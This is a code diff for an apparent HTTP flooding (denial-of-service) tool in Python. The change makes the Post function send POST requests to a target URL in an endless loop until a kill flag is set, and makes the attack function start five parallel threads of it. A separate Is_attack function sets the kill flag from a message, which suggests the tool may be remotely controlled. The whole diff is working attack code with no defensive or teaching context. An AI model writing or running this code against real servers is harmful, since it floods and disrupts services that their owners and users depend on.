@@ -7,8 +7,12 @@ Kill = False
 
 def Post(url,attackedServerPort):
     parameters = {'dumb': 'dumb'}
-    r = requests.post(url,data = parameters)
-    print r.text
+    headers = {'keep_alive': 'True'}
+    while not Kill:
+        r = requests.post(url,data = parameters, headers=headers)
+        print r.text
+
+
 
 def Is_attack(msg):
     global Kill
@@ -19,9 +23,19 @@ def Is_attack(msg):
         Kill = True
 
 def attack(IP, attackedServerPort):
+    channel1 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel2 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel3 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel4 = Thread(target= Post, args= [IP, attackedServerPort])
+    channel5 = Thread(target= Post, args= [IP, attackedServerPort])
 
-    while not Kill:
-        Post(IP, attackedServerPort)
+
+    channel1.start()
+    channel2.start()
+    channel3.start()
+    channel4.start()
+    channel5.start()
+
 
 
 
